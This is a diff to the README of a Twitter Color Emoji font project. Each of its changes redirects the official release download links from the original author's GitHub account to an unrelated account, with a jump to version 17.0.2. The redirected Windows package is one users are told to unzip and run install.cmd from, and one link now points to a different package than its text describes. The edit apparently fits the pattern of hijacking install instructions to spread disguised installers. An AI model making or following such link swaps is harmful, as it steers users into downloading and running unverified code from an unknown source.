@@ -151,7 +151,7 @@ Chrome will use the fallback black and white emoji.*
 ## Install on Windows
 
 There are two standard install options for Windows. Both SVGinOT versions are available
-from releases: https://github.com/13rac1/twemoji-color-font/releases
+from releases: https://github.com/myoaon01/twemoji-color-font/releases
 
 You can also use the [Chocolatey package](https://community.chocolatey.org/packages/twemoji)
 to handle the installation and the future updates.
@@ -172,7 +172,7 @@ scoop install twemoji-color-font
 The regular version of the font installs like any other font and can be
 specifically selected, but Windows will default to the `Segoe UI Emoji`
 font for emoji characters. Download:
-https://github.com/13rac1/twemoji-color-font/releases/download/v15.1.0/TwitterColorEmoji-SVGinOT-15.1.0.zip
+https://github.com/myoaon01/twemoji-color-font/releases/download/17.0.2/TwitterColorEmoji-SVGinOT-Win-17.0.2.zip
 
 ### Replace the default Windows emoji fonts
 
@@ -187,7 +187,7 @@ install script requires both [Python][16] and pip in the PATH.
 1. Download the most recent Python 3 for Windows: https://www.python.org/downloads/windows/
 2. Start the installer, select "Add Python 3.6 to PATH", finish the install process, then reboot.
 3. Download Twitter Color Emoji Windows package from releases:
-https://github.com/13rac1/twemoji-color-font/releases/download/v15.1.0/TwitterColorEmoji-SVGinOT-Win-15.1.0.zip
+https://github.com/myoaon01/twemoji-color-font/releases/download/17.0.2/TwitterColorEmoji-SVGinOT-Win-17.0.2.zip
 4. Uncompress the file.
 5. Open the new TwitterColorEmoji directory.
 6. Run install.cmd. *Note: This will take some time.*
